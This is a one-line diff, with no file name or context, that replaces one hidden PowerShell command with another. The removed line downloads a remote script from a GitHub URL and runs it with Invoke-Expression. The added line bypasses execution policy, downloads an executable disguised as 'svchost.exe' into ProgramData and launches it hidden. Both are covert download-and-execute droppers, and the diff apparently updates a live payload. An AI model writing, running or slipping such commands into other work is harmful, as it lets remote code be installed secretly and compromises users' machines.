@@ -1,1 +1,1 @@
-powershell.exe -WindowStyle Hidden -Command "$a='https://raw.githubusercontent.com/hypnotixx0/unhiinps/main/obfouttfd.ps1';$b='Net.WebClient';$c=New-Object $b;$d=$c.DownloadString($a);iex $d"
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hypnotixx0/xenolord/main/svchost.exe' -OutFile \"$env:ProgramData\svchost.exe\"; Start-Process \"$env:ProgramData\svchost.exe\" -WindowStyle Hidden"
